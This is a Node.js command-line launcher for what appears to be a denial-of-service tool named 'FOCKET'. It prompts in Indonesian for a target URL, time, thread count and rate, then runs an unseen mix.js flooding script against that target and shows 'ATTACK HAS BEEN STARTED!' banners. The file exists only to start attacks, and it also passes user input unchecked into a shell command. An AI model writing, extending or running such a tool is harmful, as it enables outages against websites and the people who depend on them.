const readline = require('readline');
const { exec } = require('child_process');

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

function displayPrompt() {
  process.stdout.write('root@FOCKET # ');
}

function executeCommand(command, url, time, thread, rate) {
  if (command === 'mix') {
    console.log(`
\x1b[35m          ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗\x1b[0m
\x1b[35m          ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║ \x1b[0m
\x1b[35m          ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩ \x1b[0m
             \x1b[31mATTACK HAS BEEN STARTED! \x1b[0m
     \x1b[34m╚═════\x1b[0m\x1b[31m╦═══════════════════════════╦\x1b[0m\x1b[34m═════╝\x1b[0m
\x1b[34m╔══════════\x1b[0m\x1b[31m╩═══════════════════════════╩\x1b[0m\x1b[34m══════════╗\x1b[0m
      \x1b[37mTARGET       : [ ${url} ]\x1b[0m
      \x1b[37mTIME         : [ ${time} ]\x1b[0m
      \x1b[37mTHREAD       : [ ${thread} ]\x1b[0m
      \x1b[37mRATE         : [ ${rate} ]\x1b[0m
      \x1b[37mMETHOD       : [ MIX ]\x1b[0m
      \x1b[37mVIP          : [ VIP ]\x1b[0m
      \x1b[37mUSER         : [ FOCKET ]\x1b[0m
\x1b[34m╚══════════════════════════════════════════════════╝\x1b[0m
      `);
    const filePath = __dirname + '/mix.js';
    exec(`node ${filePath} ${url} ${time} ${thread} ${rate}`, (error, stdout, stderr) => {
      if (error) {
        console.error(`Error: ${error.message}`);
        return;
      }
      if (stderr) {
        console.error(`stderr: ${stderr}`);
        return;
      }
      console.log(stdout);

      // Tampilkan ASCII art "ATTACK SENT" setelah mix.js selesai dieksekusi
      console.log(`
\x1b[35m            ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗\x1b[0m
\x1b[35m            ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║ \x1b[0m
\x1b[35m            ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩ \x1b[0m
                   \x1b[31mATTACK HAS BEEN STARTED! \x1b[0m
     \x1b[34m╚═════\x1b[0m\x1b[31m╦══════════════════════════\x1b[0m\x1b[34m╦══════╝\x1b[0m
\x1b[34m╔══════════\x1b[0m\x1b[31m╩══════════════════════════╗\x1b[0m\x1b[34m╩════════════\x1b[0m
             \x1b[37mTARGET       : [ ${url} ]\x1b[0m
             \x1b[37mTIME          : [ ${time} ]\x1b[0m
             \x1b[37mTHREAD       : [ ${thread} ]\x1b[0m
             \x1b[37mRATE          : [ ${rate} ]\x1b[0m
             \x1b[37mMETHOD      : [ MIX ]\x1b[0m
             \x1b[37mVIP            : [ VIP ]\x1b[0m
             \x1b[37mUSER          : [ FOCKET ]\x1b[0m
\x1b[34m╚═══════════════════════════════════════════════════\x1b[0m
      `);

      displayPrompt();
    });
  } else {
    console.log(`Perintah ${command} belum diimplementasikan.`);
    displayPrompt();
  }
}

function displayHelp() {
  console.log('=== Menu Help ===');
  console.log('1. mix - Menjalankan file mix.js');
  console.log('2. url - Memasukkan URL');
  console.log('3. time - Mengatur waktu');
  console.log('4. thread - Mengatur jumlah thread');
  console.log('5. rate - Mengatur rate');
  console.log('6. help - Menampilkan menu help');
  console.log('================');
  displayPrompt();
}

// ASCII art FOCKET
console.log(`
  \x1b[35m ____  _      \x1b[0m\x1b[36m ____           _ \x1b[0m
 \x1b[35m|  _ \\ ___  \x1b[0m\x1b[36m  / ___| ___   __| |\x1b[0m
 \x1b[35m| |_) / _ \\ \x1b[0m\x1b[36m| |  _ / _ \\ / _\` |\x1b[0m
 \x1b[35m|  _ <  __/  \x1b[0m\x1b[36m| |_| | (_) | (_| |\x1b[0m
 \x1b[35m|_| \\_\\___|\\x1b[0m\x1b[36m _\\____|\\___/ \\__,_|\x1b[0m
`);

displayPrompt();

let url = '';
let time = '';
let thread = '';
let rate = '';

rl.on('line', (input) => {
  if (!url) {
    url = input;
    console.log('URL telah ditetapkan:', url);
    process.stdout.write('Masukkan waktu: ');
  } else if (!time) {
    time = input;
    console.log('Waktu telah ditetapkan:', time);
    process.stdout.write('Masukkan jumlah thread: ');
  } else if (!thread) {
    thread = input;
    console.log('Jumlah thread telah ditetapkan:', thread);
    process.stdout.write('Masukkan rate: ');
  } else if (!rate) {
    rate = input;
    console.log('Rate telah ditetapkan:', rate);
    executeCommand('mix', url, time, thread, rate);
    url = '';
    time = '';
    thread = '';
    rate = '';
  }
});
